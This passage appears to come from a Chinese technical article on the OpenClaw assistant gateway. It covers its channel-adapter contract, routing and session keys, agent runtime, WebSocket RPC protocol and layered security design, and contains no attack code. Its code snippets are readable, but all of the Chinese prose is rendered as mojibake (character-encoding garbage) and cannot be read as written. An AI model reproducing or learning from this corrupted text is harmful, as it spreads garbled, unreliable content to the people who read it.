<p>ç»Ÿä¸€ 30+ æ¶ˆæ¯å¹³å°æ˜¯ OpenClaw æœ€å…·å·¥ç¨‹æŒ‘æˆ˜çš„éƒ¨åˆ†ã€‚æ¯ä¸ªå¹³å°éƒ½æœ‰æˆªç„¶ä¸åŒçš„è®¤è¯æ–¹å¼ï¼ˆBot Token / OAuth / QR ç æ‰«æï¼‰ã€æ¶ˆæ¯æ ¼å¼ï¼ˆMarkdown / HTML / å¯Œæ–‡æœ¬ï¼‰ã€èƒ½åŠ›å·®å¼‚ï¼ˆæŒ‰é’® / åµŒå…¥ / çº¯æ–‡å­—ï¼‰å’Œé€Ÿç‡é™åˆ¶ã€‚</p>
<p>OpenClaw çš„è§£æ³•æ˜¯ä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„<strong>å¤šé€‚é…å™¨ç»„åˆå¥‘çº¦</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">ChannelPlugin</span>&lt;<span class="hljs-title class_">ResolvedAccount</span> = <span class="hljs-built_in">any</span>, <span class="hljs-title class_">Probe</span> = <span class="hljs-built_in">unknown</span>, <span class="hljs-title class_">Audit</span> = <span class="hljs-built_in">unknown</span>&gt; = {
  <span class="hljs-attr">id</span>: <span class="hljs-title class_">ChannelId</span>;                              <span class="hljs-comment">// æ¸ é“å”¯ä¸€æ ‡è¯†</span>
  <span class="hljs-attr">meta</span>: <span class="hljs-title class_">ChannelMeta</span>;                          <span class="hljs-comment">// å…ƒä¿¡æ¯</span>
  <span class="hljs-attr">capabilities</span>: <span class="hljs-title class_">ChannelCapabilities</span>;          <span class="hljs-comment">// èƒ½åŠ›å£°æ˜</span>
  <span class="hljs-attr">config</span>: <span class="hljs-title class_">ChannelConfigAdapter</span>&lt;<span class="hljs-title class_">ResolvedAccount</span>&gt;;  <span class="hljs-comment">// é…ç½®</span>
  setup?: <span class="hljs-title class_">ChannelSetupAdapter</span>;                <span class="hljs-comment">// å®‰è£…å‘å¯¼</span>
  pairing?: <span class="hljs-title class_">ChannelPairingAdapter</span>;            <span class="hljs-comment">// è®¾å¤‡é…å¯¹</span>
  security?: <span class="hljs-title class_">ChannelSecurityAdapter</span>;          <span class="hljs-comment">// å®‰å…¨ç­–ç•¥</span>
  groups?: <span class="hljs-title class_">ChannelGroupAdapter</span>;               <span class="hljs-comment">// ç¾¤ç»„ç®¡ç†</span>
  outbound?: <span class="hljs-title class_">ChannelOutboundAdapter</span>;          <span class="hljs-comment">// å‡ºç«™æ¶ˆæ¯</span>
  gateway?: <span class="hljs-title class_">ChannelGatewayAdapter</span>;            <span class="hljs-comment">// Gateway æ–¹æ³•</span>
  streaming?: <span class="hljs-title class_">ChannelStreamingAdapter</span>;        <span class="hljs-comment">// æµå¼è¾“å‡º</span>
  threading?: <span class="hljs-title class_">ChannelThreadingAdapter</span>;        <span class="hljs-comment">// æ¶ˆæ¯çº¿ç¨‹</span>
  messaging?: <span class="hljs-title class_">ChannelMessagingAdapter</span>;        <span class="hljs-comment">// æ¶ˆæ¯æ”¶å‘</span>
  heartbeat?: <span class="hljs-title class_">ChannelHeartbeatAdapter</span>;        <span class="hljs-comment">// å¿ƒè·³æ£€æµ‹</span>
  agentTools?: <span class="hljs-title class_">ChannelAgentToolFactory</span>;       <span class="hljs-comment">// æ¸ é“ä¸“å±å·¥å…·</span>
  <span class="hljs-comment">// ... æ›´å¤šé€‚é…å™¨</span>
};
</code></pre>
<p>è¿™ä¸ªè®¾è®¡çš„æ ¸å¿ƒäº®ç‚¹æ˜¯<strong>å¯é€‰é€‚é…å™¨ï¼ˆOptional Adaptersï¼‰</strong>ã€‚æ‰€æœ‰é€‚é…å™¨å­—æ®µå‡æ ‡è®°ä¸º <code>?</code>ï¼Œæ¸ é“åªéœ€å®ç°å…¶æ”¯æŒçš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼ŒSMS æ¸ é“ä¸éœ€è¦ <code>streaming</code> å’Œ <code>threading</code>ï¼›Telegram ä¸éœ€è¦ <code>pairing</code>ï¼›è€Œ iMessage å¯èƒ½éœ€è¦ç‰¹æ®Šçš„ <code>setup</code> æµç¨‹ã€‚</p>
<p>é€šè¿‡æ³›å‹ <code>&lt;ResolvedAccount, Probe, Audit&gt;</code>ï¼Œä¸åŒæ¸ é“çš„è´¦å·ä½“ç³»ã€å¥åº·æ¢æµ‹ã€å®¡è®¡æ—¥å¿—éƒ½èƒ½è·å¾—ç±»å‹å®‰å…¨çš„æ”¯æŒã€‚</p>
<h4 data-id="heading-15">4.2 èƒ½åŠ›å£°æ˜ï¼šè®©ç³»ç»ŸçŸ¥é“æ¸ é“èƒ½åšä»€ä¹ˆ</h4>
<p>æ¯ä¸ªæ¸ é“é€šè¿‡ <code>capabilities</code> å­—æ®µå£°æ˜è‡ªå·±çš„èƒ½åŠ›ã€‚è¿™è®© Gateway å¯ä»¥æ™ºèƒ½åœ°é€‚é…è¡Œä¸ºâ€”â€”å¦‚æœæ¸ é“ä¸æ”¯æŒ Markdownï¼Œå°±è‡ªåŠ¨è½¬æ¢ä¸ºçº¯æ–‡æœ¬ï¼›å¦‚æœæ¸ é“æœ‰æ¶ˆæ¯é•¿åº¦é™åˆ¶ï¼Œå°±è‡ªåŠ¨åˆ†å—å‘é€ï¼›å¦‚æœæ¸ é“æ”¯æŒæŒ‰é’®ï¼Œå°±å¯ä»¥æ¸²æŸ“äº¤äº’å¼æ“ä½œã€‚</p>
<h4 data-id="heading-16">4.3 æ¸ é“å…¨æ™¯</h4>
<p>æŒ‰ç±»åˆ«çœ‹ï¼ŒOpenClaw ç›®å‰æ”¯æŒçš„æ¸ é“æ¶µç›–äº†å‡ ä¹æ‰€æœ‰ä¸»æµæ¶ˆæ¯ç”Ÿæ€ï¼š</p>








































<table><thead><tr><th>ç±»åˆ«</th><th>æ¸ é“</th><th>å®ç°æ–¹å¼</th></tr></thead><tbody><tr><td><strong>ä¸»æµå³æ—¶é€šè®¯</strong></td><td>WhatsAppã€Telegramã€Signalã€iMessage</td><td>Baileysã€grammYã€signal-cliã€AppleScript</td></tr><tr><td><strong>åä½œå¹³å°</strong></td><td>Slackã€Discordã€Microsoft Teamsã€Google Chat</td><td>@slack/boltã€@buape/carbonã€Graph API</td></tr><tr><td><strong>äºšå¤ªå¹³å°</strong></td><td>é£ä¹¦/Larkã€LINEã€Zalo</td><td>é£ä¹¦ APIã€LINE SDKã€Zalo API</td></tr><tr><td><strong>å»ä¸­å¿ƒåŒ–åè®®</strong></td><td>Matrixã€Nostr</td><td>matrix-js-sdkã€nostr-tools</td></tr><tr><td><strong>è‡ªæ‰˜ç®¡æ–¹æ¡ˆ</strong></td><td>Mattermostã€Nextcloud Talk</td><td>REST API</td></tr><tr><td><strong>ç›´æ’­/ç¤¾äº¤</strong></td><td>Twitchã€BlueBubbles</td><td>Twitch IRCã€BlueBubbles API</td></tr></tbody></table>
<p>7 ä¸ªå†…ç½® + 30+ ä¸ªæ‰©å±•ï¼ŒOpenClaw çœŸæ­£å®ç°äº†"ä¸€ä¸ª AI åŠ©æ‰‹ï¼Œåˆ°å¤„å¯ç”¨"ã€‚</p>
<hr/>
<h3 data-id="heading-17">äº”ã€æ¶ˆæ¯å¤„ç†å…¨é“¾è·¯ï¼šä»å…¥ç«™åˆ°å›å¤</h3>
<h4 data-id="heading-18">5.1 å®Œæ•´æ¶ˆæ¯å¤„ç†æµæ°´çº¿</h4>
<p>å½“ä¸€æ¡æ¶ˆæ¯ä»ä»»æ„æ¸ é“è¿›å…¥ç³»ç»Ÿæ—¶ï¼Œå®ƒä¼šç»å†ä¸ƒä¸ªç²¾å¿ƒç¼–æ’çš„å¤„ç†é˜¶æ®µï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">â‘  Channel Monitor     æ¥æ”¶å¤–éƒ¨æ¶ˆæ¯ï¼Œæ ¼å¼å½’ä¸€åŒ–
<span class="hljs-code">        â†“
â‘¡ Routing Engine      è·¯ç”±è§£æ â†’ å†³å®šå“ªä¸ª Agent å¤„ç†
        â†“
â‘¢ Session Manager     æ„å»ºä¼šè¯é”® â†’ åŠ è½½æˆ–åˆ›å»ºä¼šè¯
        â†“
â‘£ Gate Checks         é—¨æ§æ£€æŸ¥ï¼šå‘½ä»¤æ‹¦æˆªã€æåŠæ£€æµ‹ã€é˜²æŠ–ã€å»é‡
        â†“
â‘¤ Agent Runtime       AI æ¨ç† + å·¥å…·è°ƒç”¨ + æŠ€èƒ½æ‰§è¡Œ
        â†“
â‘¥ Reply Dispatcher    å›å¤åˆ†å‘ï¼šåˆ†å—ã€æ ¼å¼åŒ–ã€æ‰“å­—æŒ‡ç¤ºå™¨
        â†“
â‘¦ Channel Outbound    æ¸ é“é€‚é…ï¼Œè°ƒç”¨å¹³å° API å‘é€
</span></code></pre>
<p>è¿™æ¡æµæ°´çº¿çš„å…³é”®è®¾è®¡åŸåˆ™æ˜¯<strong>æ¸ é“æ— å…³æ€§</strong>ï¼šä»ç¬¬â‘¡æ­¥åˆ°ç¬¬â‘¥æ­¥ï¼Œç³»ç»Ÿå®Œå…¨ä¸å…³å¿ƒæ¶ˆæ¯æ¥è‡ªå“ªä¸ªæ¸ é“ï¼Œä¹Ÿä¸å…³å¿ƒå›å¤è¦å‘åˆ°å“ªé‡Œã€‚è¿™ç§è§£è€¦æ„å‘³ç€æ–°å¢æ¸ é“åªéœ€å®ç°å…¥ç«™å’Œå‡ºç«™é€‚é…å™¨ï¼Œæ ¸å¿ƒé€»è¾‘ä¸€è¡Œä¸æ”¹ã€‚</p>
<h4 data-id="heading-19">5.2 è·¯ç”±å¼•æ“ï¼šä¸ƒçº§ä¼˜å…ˆçº§åŒ¹é…</h4>
<p>è·¯ç”±å¼•æ“æ˜¯ç½‘å…³çš„"äº¤é€šæ¢çº½"ï¼Œå†³å®šæ¯æ¡å…¥ç«™æ¶ˆæ¯ç”±å“ªä¸ª Agent å¤„ç†ã€‚å®ƒé‡‡ç”¨<strong>ä»ç²¾ç¡®åˆ°æ¨¡ç³Š</strong>çš„ä¸ƒçº§ä¼˜å…ˆçº§åŒ¹é…ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">ä¼˜å…ˆçº§ä»é«˜åˆ°ä½ï¼š
<span class="hljs-bullet">1.</span> binding.peer         â†’ ç²¾ç¡®åŒ¹é…ï¼ˆpeer.kind + peer.idï¼‰
<span class="hljs-bullet">2.</span> binding.peer.parent  â†’ çˆ¶çº§åŒ¹é…ï¼ˆé€‚ç”¨äºçº¿ç¨‹æ¶ˆæ¯ï¼‰
<span class="hljs-bullet">3.</span> binding.guild        â†’ Discord Guild åŒ¹é…
<span class="hljs-bullet">4.</span> binding.team         â†’ Slack Team åŒ¹é…
<span class="hljs-bullet">5.</span> binding.account      â†’ è´¦å·çº§åŒ¹é…
<span class="hljs-bullet">6.</span> binding.channel      â†’ æ¸ é“çº§åŒ¹é…ï¼ˆä»»æ„è´¦å·ï¼‰
<span class="hljs-bullet">7.</span> default              â†’ é»˜è®¤ Agentï¼ˆé…ç½®æˆ– "main"ï¼‰
</code></pre>
<p>è¿™ç§å¤šçº§è·¯ç”±è®©ç”¨æˆ·å¯ä»¥ç²¾ç»†åœ°æ§åˆ¶æ¶ˆæ¯åˆ†é…ï¼šç‰¹å®šçš„ Telegram è”ç³»äººèµ°"ç¼–ç¨‹åŠ©æ‰‹"Agentï¼ŒSlack å·¥ä½œç¾¤èµ°"å·¥ä½œåŠ©ç†"Agentï¼Œå…¶ä½™å…¨éƒ¨èµ°é»˜è®¤çš„é€šç”¨ Agentã€‚</p>
<h4 data-id="heading-20">5.3 ä¼šè¯é”®ï¼šç²¾ç»†åŒ–éš”ç¦»çš„ç§˜å¯†</h4>
<p>ä¼šè¯ç®¡ç†é‡‡ç”¨å¤åˆé”®è®¾è®¡ï¼Œæ ¼å¼ä¸º <code>agent:&lt;agentId&gt;:&lt;channel&gt;:&lt;type&gt;:&lt;id&gt;</code>ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">agent:</span>main:telegram:direct:<span class="hljs-number">123456</span>           â†’ Telegram ç§èŠ
<span class="hljs-symbol">agent:</span>main:discord:<span class="hljs-keyword">group</span>:<span class="hljs-number">789012</span>             â†’ Discord ç¾¤ç»„
<span class="hljs-symbol">agent:</span>main:slack:<span class="hljs-keyword">group</span>:C001:thread:T002     â†’ Slack çº¿ç¨‹
</code></pre>
<p>æ›´ç²¾å¦™çš„æ˜¯ <strong>DM ä½œç”¨åŸŸï¼ˆdmScopeï¼‰</strong> é…ç½®ï¼š</p>

























<table><thead><tr><th>æ¨¡å¼</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td><code>main</code></td><td>æ‰€æœ‰ DM å…±äº«åŒä¸€ä¸ªä¼šè¯</td></tr><tr><td><code>per-peer</code></td><td>æŒ‰å¯¹æ–¹ ID éš”ç¦»</td></tr><tr><td><code>per-channel-peer</code></td><td>æŒ‰æ¸ é“ + å¯¹æ–¹ ID éš”ç¦»</td></tr><tr><td><code>per-account-channel-peer</code></td><td>æŒ‰è´¦å· + æ¸ é“ + å¯¹æ–¹ ID éš”ç¦»</td></tr></tbody></table>
<p>é…åˆ**èº«ä»½é“¾æ¥ï¼ˆIdentity Linksï¼‰**æœºåˆ¶ï¼ŒåŒä¸€ä¸ªäººåœ¨ä¸åŒå¹³å°ä¸Šçš„èº«ä»½å¯ä»¥å…³è”èµ·æ¥ï¼Œå®ç°è·¨æ¸ é“çš„ä¼šè¯ä¸Šä¸‹æ–‡å…±äº«ã€‚</p>
<h4 data-id="heading-21">5.4 é—¨æ§ç³»ç»Ÿï¼šå››é‡è¿‡æ»¤</h4>
<p>åœ¨è·¯ç”±å’Œä¼šè¯è§£æä¹‹åã€Agent æ‰§è¡Œä¹‹å‰ï¼Œæ¶ˆæ¯è¿˜éœ€è¦é€šè¿‡å››é“"é—¨æ§"ï¼š</p>
<p><strong>å‘½ä»¤æ‹¦æˆªï¼ˆCommand Gateï¼‰</strong>ï¼šæ£€æµ‹ <code>/reset</code>ã€<code>/help</code> ç­‰æ§åˆ¶å‘½ä»¤ï¼Œç›´æ¥å¤„ç†è€Œä¸è¿›å…¥ Agentã€‚</p>
<p><strong>æåŠæ£€æµ‹ï¼ˆMention Gateï¼‰</strong>ï¼šåœ¨ç¾¤ç»„åœºæ™¯ä¸­ï¼Œåªæœ‰æ˜ç¡®æåŠï¼ˆ@mentionï¼‰AI çš„æ¶ˆæ¯æ‰ä¼šè§¦å‘å¤„ç†ã€‚</p>
<p><strong>é˜²æŠ–ï¼ˆDebouncerï¼‰</strong>ï¼šç”¨æˆ·å¿«é€Ÿè¿ç»­å‘é€å¤šæ¡æ¶ˆæ¯æ—¶ï¼Œåˆå¹¶ä¸ºä¸€æ¬¡å¤„ç†ã€‚</p>
<p><strong>å»é‡ï¼ˆDeduplicationï¼‰</strong>ï¼šåŸºäº <code>idempotencyKey</code> é˜²æ­¢åŒä¸€æ¶ˆæ¯è¢«é‡å¤å¤„ç†â€”â€”è¿™åœ¨ Webhook åœºæ™¯ä¸­å°¤ä¸ºé‡è¦ã€‚</p>
<hr/>
<h3 data-id="heading-22">å…­ã€Agent è¿è¡Œæ—¶ï¼šåµŒå…¥å¼è®¾è®¡çš„ç²¾å¦™</h3>
<h4 data-id="heading-23">6.1 ä¸ºä»€ä¹ˆé€‰æ‹©åµŒå…¥å¼ï¼Ÿ</h4>
<p>å¤§å¤šæ•° AI åŠ©æ‰‹æ¡†æ¶é‡‡ç”¨<strong>å­è¿›ç¨‹</strong>æ–¹å¼è¿è¡Œ Agentâ€”â€”ä¸»è¿›ç¨‹é€šè¿‡ stdin/stdout æˆ– HTTP ä¸ Agent è¿›ç¨‹é€šä¿¡ã€‚OpenClaw åšäº†ä¸€ä¸ªä¸åŒçš„é€‰æ‹©ï¼š<strong>å°† Pi Coding Agent SDK ä»¥åº“çš„å½¢å¼ç›´æ¥åµŒå…¥è¿è¡Œ</strong>ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createAgentSession, <span class="hljs-title class_">SessionManager</span>, <span class="hljs-title class_">SettingsManager</span> } 
  <span class="hljs-keyword">from</span> <span class="hljs-string">"@mariozechner/pi-coding-agent"</span>;
</code></pre>
<p>è¿™å¸¦æ¥äº†ä¸‰ä¸ªå…³é”®ä¼˜åŠ¿ï¼š</p>
<ol>
<li><strong>æ›´ä½å»¶è¿Ÿ</strong>ï¼šæ— éœ€è·¨è¿›ç¨‹ IPCï¼Œå·¥å…·è°ƒç”¨å’Œäº‹ä»¶æµå¯ä»¥åœ¨æ¯«ç§’çº§å®Œæˆ</li>
<li><strong>æ›´ç®€å•çš„ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šä¸éœ€è¦ç®¡ç†å­è¿›ç¨‹çš„å¯åŠ¨ã€å´©æºƒæ¢å¤å’Œèµ„æºå›æ”¶</li>
<li><strong>æ›´çµæ´»çš„é›†æˆ</strong>ï¼šå¯ä»¥ç›´æ¥è®¿é—® Gateway çš„å†…å­˜çŠ¶æ€ï¼Œå¦‚ä¼šè¯ã€é…ç½®ã€æ¸ é“ä¿¡æ¯</li>
</ol>
<h4 data-id="heading-24">6.2 æ‰§è¡Œæµç¨‹</h4>
<p>Agent çš„ä¸€æ¬¡å®Œæ•´æ‰§è¡Œç»å†ä»¥ä¸‹æ­¥éª¤ï¼š</p>
<pre><code class="hljs language-java" lang="java">Gateway RPC: agent è¯·æ±‚
  â†’ å‚æ•°æ ¡éªŒ (validateAgentParams)
    â†’ å¹‚ç­‰æ€§æ£€æŸ¥ (idempotencyKey å»é‡)
      â†’ ä¼šè¯è§£æ (è·å– sessionKey å’Œ sessionId)
        â†’ é˜Ÿåˆ—ä¸²è¡ŒåŒ– (åŒä¸€ä¼šè¯å†…æ’é˜Ÿ)
          â†’ è¿è¡Œ Pi <span class="hljs-title function_">Agent</span> <span class="hljs-params">(runEmbeddedPiAgent)</span>
            â†’ æµå¼äº‹ä»¶è®¢é˜… (subscribeEmbeddedPiSession)
              â†’ Gateway å¹¿æ’­ (å‘æ‰€æœ‰å®¢æˆ·ç«¯æ¨é€)
                â†’ å›å¤åˆ†å‘ (ReplyDispatcher â†’ æ¸ é“æŠ•é€’)
</code></pre>
<h4 data-id="heading-25">6.3 é˜Ÿåˆ—åŒ–ä¸²è¡Œæ‰§è¡Œ</h4>
<p>ä¸€ä¸ªå…³é”®çš„è®¾è®¡å†³ç­–æ˜¯ï¼š<strong>åŒä¸€ä¼šè¯å†…çš„ Agent æ‰§è¡Œä¸¥æ ¼ä¸²è¡Œ</strong>ã€‚</p>
<p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸º AI Agent çš„æ‰§è¡Œæ¶‰åŠå¯¹è¯ä¸Šä¸‹æ–‡çš„è¯»å†™â€”â€”ä¸¤ä¸ªå¹¶å‘æ‰§è¡Œå¯èƒ½ä¼šäº¤å‰è¯»å†™åŒä¸€ä¸ª transcriptï¼Œå¯¼è‡´ä¸Šä¸‹æ–‡æ··ä¹±ã€‚é€šè¿‡é˜Ÿåˆ—åŒ–ï¼ŒOpenClaw ä¿è¯äº†æ¯ä¸ªä¼šè¯åœ¨ä»»ä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ª Agent è¿è¡Œã€‚</p>
<p>ä½†è¿™ä¸æ„å‘³ç€ç”¨æˆ·å¿…é¡»ç­‰å¾…ã€‚OpenClaw æä¾›äº†ä¸‰ç§é˜Ÿåˆ—æ¨¡å¼ï¼š</p>

























<table><thead><tr><th>æ¨¡å¼</th><th>è¡Œä¸º</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><code>steer</code></td><td>å°†æ’é˜Ÿæ¶ˆæ¯æ³¨å…¥å½“å‰è¿è¡Œä¸­çš„ Agent Turn</td><td>ç”¨æˆ·è¿½åŠ ä¿¡æ¯ä¿®æ­£æ–¹å‘</td></tr><tr><td><code>followup</code></td><td>ç­‰å¾…å½“å‰ Turn ç»“æŸåå¯åŠ¨æ–° Turn</td><td>å¸¸è§„å¤šè½®å¯¹è¯</td></tr><tr><td><code>collect</code></td><td>æ‰¹é‡æ”¶é›†æ’é˜Ÿæ¶ˆæ¯åä¸€æ¬¡æ€§å¤„ç†</td><td>ç¾¤ç»„æ¶ˆæ¯èšåˆ</td></tr></tbody></table>
<h4 data-id="heading-26">6.4 Transcript Compactionï¼šä¼˜é›…çš„ä¸Šä¸‹æ–‡ç®¡ç†</h4>
<p>LLM éƒ½æœ‰ä¸Šä¸‹æ–‡çª—å£é™åˆ¶ã€‚å½“å¯¹è¯å†å²è¶…è¿‡é™åˆ¶æ—¶ï¼ŒOpenClaw ä¸æ˜¯ç®€å•åœ°æˆªæ–­ï¼Œè€Œæ˜¯æ‰§è¡Œ<strong>å¯¹è¯å‹ç¼©ï¼ˆTranscript Compactionï¼‰</strong>â€”â€”ä½¿ç”¨ AI å¯¹è¿‡æ—©çš„å¯¹è¯åšæ‘˜è¦ï¼Œä¿ç•™å…³é”®ä¿¡æ¯çš„åŒæ—¶é‡Šæ”¾ token ç©ºé—´ã€‚</p>
<p>ä¼šè¯æ•°æ®ä»¥ JSONL æ ¼å¼è¿½åŠ å†™å…¥ <code>~/.openclaw/agents/&lt;agentId&gt;/sessions/&lt;sessionId&gt;.jsonl</code>ï¼Œæ—¢ä¿è¯äº†å†™å…¥æ€§èƒ½ï¼Œåˆæ”¯æŒæµå¼æ¢å¤ã€‚</p>
<hr/>
<h3 data-id="heading-27">ä¸ƒã€Gateway WebSocket åè®®ï¼šè‡ªç ” RPC çš„è®¾è®¡è€ƒé‡</h3>
<h4 data-id="heading-28">7.1 åè®®ç»“æ„</h4>
<p>Gateway ä½¿ç”¨è‡ªç ”çš„ WebSocket JSON-RPC åè®®ï¼Œæ”¯æŒ 90+ æ–¹æ³•ã€‚åè®®å®šä¹‰é‡‡ç”¨ Protocol-First æ–¹å¼ï¼Œæ‰€æœ‰ Schema é›†ä¸­åœ¨ <code>src/gateway/protocol/schema/</code> ä¸‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">protocol/schema/
â”œâ”€â”€ agent.ts              <span class="hljs-comment"># Agent è¯·æ±‚/å“åº”</span>
â”œâ”€â”€ channels.ts           <span class="hljs-comment"># æ¸ é“æ“ä½œ</span>
â”œâ”€â”€ config.ts             <span class="hljs-comment"># é…ç½®ç®¡ç†</span>
â”œâ”€â”€ cron.ts               <span class="hljs-comment"># å®šæ—¶ä»»åŠ¡</span>
â”œâ”€â”€ devices.ts            <span class="hljs-comment"># è®¾å¤‡ç®¡ç†</span>
â”œâ”€â”€ frames.ts             <span class="hljs-comment"># WebSocket å¸§æ ¼å¼</span>
â”œâ”€â”€ sessions.ts           <span class="hljs-comment"># ä¼šè¯æ“ä½œ</span>
â”œâ”€â”€ snapshot.ts           <span class="hljs-comment"># çŠ¶æ€å¿«ç…§</span>
â””â”€â”€ wizard.ts             <span class="hljs-comment"># å¼•å¯¼å‘å¯¼</span>
</code></pre>
<p>ä¸‰ç§å¸§ç±»å‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// è¯·æ±‚å¸§ï¼šå®¢æˆ·ç«¯ â†’ Gateway</span>
{ <span class="hljs-attr">type</span>: <span class="hljs-string">"req"</span>, <span class="hljs-attr">method</span>: <span class="hljs-string">"agent"</span>, <span class="hljs-attr">params</span>: {...}, <span class="hljs-attr">id</span>: <span class="hljs-string">"uuid"</span> }

<span class="hljs-comment">// å“åº”å¸§ï¼šGateway â†’ å®¢æˆ·ç«¯</span>
{ <span class="hljs-attr">type</span>: <span class="hljs-string">"res"</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">"uuid"</span>, <span class="hljs-attr">result</span>: {...} }
{ <span class="hljs-attr">type</span>: <span class="hljs-string">"res"</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">"uuid"</span>, <span class="hljs-attr">error</span>: { <span class="hljs-attr">code</span>: <span class="hljs-string">"..."</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">"..."</span> } }

<span class="hljs-comment">// äº‹ä»¶å¸§ï¼šGateway â†’ å®¢æˆ·ç«¯ï¼ˆæœåŠ¡ç«¯æ¨é€ï¼‰</span>
{ <span class="hljs-attr">type</span>: <span class="hljs-string">"event"</span>, <span class="hljs-attr">event</span>: <span class="hljs-string">"agent"</span>, <span class="hljs-attr">payload</span>: {...} }
</code></pre>
<h4 data-id="heading-29">7.2 è·¨ç«¯ç±»å‹ä¸€è‡´æ€§</h4>
<p>ä¸€ä¸ªå€¼å¾—å…³æ³¨çš„å·¥ç¨‹å®è·µæ˜¯ï¼šåè®®çš„ JSON Schema å®šä¹‰å¯ä»¥<strong>è‡ªåŠ¨ç”Ÿæˆ Swift æ¨¡å‹ä»£ç </strong>ï¼ˆé€šè¿‡ <code>protocol:gen:swift</code> è„šæœ¬ï¼‰ã€‚è¿™ç¡®ä¿äº† TypeScript åç«¯ä¸ Swift å‰ç«¯ï¼ˆmacOS/iOSï¼‰ä¹‹é—´çš„ç±»å‹ä¸€è‡´æ€§ï¼Œé¿å…äº†æ‰‹åŠ¨åŒæ­¥ Schema å¸¦æ¥çš„æ¼‚ç§»é£é™©ã€‚</p>
<h4 data-id="heading-30">7.3 å¹¿æ’­ä¼˜åŒ–</h4>
<p>å½“ Gateway éœ€è¦å‘æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯æ¨é€äº‹ä»¶æ—¶ï¼Œå®ƒå®ç°äº†ä¸¤ä¸ªå…³é”®ä¼˜åŒ–ï¼š</p>
<p><strong>æ…¢å®¢æˆ·ç«¯ä¸¢å¼ƒï¼ˆdropIfSlowï¼‰</strong>ï¼šå¦‚æœæŸä¸ªå®¢æˆ·ç«¯çš„ WebSocket ç¼“å†²åŒºç§¯å‹è¿‡å¤šï¼Œåç»­ä½ä¼˜å…ˆçº§äº‹ä»¶ä¼šè¢«ä¸¢å¼ƒè€Œéæ’é˜Ÿï¼Œé˜²æ­¢ä¸€ä¸ªæ…¢å®¢æˆ·ç«¯æ‹–æ…¢æ•´ä¸ªç³»ç»Ÿã€‚</p>
<p><strong>çŠ¶æ€ç‰ˆæœ¬å»é‡ï¼ˆstateVersionï¼‰</strong>ï¼šé€šè¿‡ç‰ˆæœ¬å·æœºåˆ¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥è·³è¿‡ä¸­é—´çŠ¶æ€ï¼Œç›´æ¥åº”ç”¨æœ€æ–°çŠ¶æ€ï¼Œå‡å°‘ä¸å¿…è¦çš„æ¸²æŸ“ã€‚</p>
<hr/>
<h3 data-id="heading-31">å…«ã€å®‰å…¨æ¨¡å‹ï¼šå¤šå±‚çºµæ·±é˜²å¾¡</h3>
<h4 data-id="heading-32">8.1 äº”å±‚å®‰å…¨ç­–ç•¥</h4>
<p>ä½œä¸ºä¸€ä¸ªæ¥å…¥ 30+ æ¶ˆæ¯å¹³å°çš„æœ¬åœ°æœåŠ¡ï¼Œå®‰å…¨æ˜¯ OpenClaw çš„ç”Ÿå‘½çº¿ã€‚å®ƒè®¾è®¡äº†äº”å±‚çºµæ·±é˜²å¾¡ï¼š</p>
<p><strong>ç¬¬ä¸€å±‚ â€” ç½‘ç»œéš”ç¦»</strong></p>
<ul>
<li>Gateway é»˜è®¤ç»‘å®š <code>127.0.0.1</code>ï¼Œä¸å¯¹å¤–æš´éœ²</li>
<li>è¿œç¨‹è®¿é—®é€šè¿‡ Tailscale Serve/Funnelï¼ˆç«¯åˆ°ç«¯åŠ å¯†ï¼‰æˆ– SSH éš§é“å®ç°</li>
</ul>
<p><strong>ç¬¬äºŒå±‚ â€” å¤šå› ç´ è®¤è¯</strong></p>
<ul>
<li>Token è®¤è¯ï¼š<code>Authorization: Bearer &lt;token&gt;</code></li>
<li>å¯†ç è®¤è¯ï¼šè¿æ¥æ¡æ‰‹æ—¶éªŒè¯</li>
<li>Tailscale èº«ä»½ï¼šé€šè¿‡ Tailscale å¤´éƒ¨è‡ªåŠ¨éªŒè¯</li>
<li>è®¾å¤‡ç»‘å®šä»¤ç‰Œï¼šnode/operator è§’è‰²çš„è®¾å¤‡ä»¤ç‰Œ</li>
<li>å›ç¯ç›´è¿ï¼šæ¥è‡ª localhost çš„è¯·æ±‚å¯è·³è¿‡è®¤è¯</li>
</ul>
<p><strong>ç¬¬ä¸‰å±‚ â€” è§’è‰²æƒé™</strong></p>
<ul>
<li>ä¸‰ç§è§’è‰²ï¼š<code>node</code>ã€<code>operator</code>ã€<code>admin</code></li>
<li>ç»†ç²’åº¦æƒé™èŒƒå›´ï¼š<code>operator.read</code>ã€<code>operator.write</code>ã€<code>operator.approvals</code>ã€<code>operator.admin</code></li>
</ul>
<p><strong>ç¬¬å››å±‚ â€” DM é…å¯¹ç­–ç•¥</strong></p>
<ul>
<li><code>dmPolicy="pairing"</code> æ¨¡å¼ä¸‹ï¼Œé™Œç”Ÿäººé¦–æ¬¡è”ç³»éœ€è¦é…å¯¹ç¡®è®¤</li>
<li>åŸºäº allowlist çš„ç™½åå•ç®¡æ§</li>
</ul>
<p><strong>ç¬¬äº”å±‚ â€” æ²™ç®±æ‰§è¡Œ</strong></p>
<ul>
<li><code>main</code> ä¼šè¯ï¼šå®Œå…¨ä¿¡ä»»ï¼Œæ‰€æœ‰å·¥å…·å¯ç”¨</li>
<li>é main ä¼šè¯ï¼šDocker æ²™ç®±ï¼Œç¦æ­¢æµè§ˆå™¨æ§åˆ¶ã€ç³»ç»Ÿå‘½ä»¤ç­‰æ•æ„Ÿæ“ä½œ</li>
</ul>
<hr/>
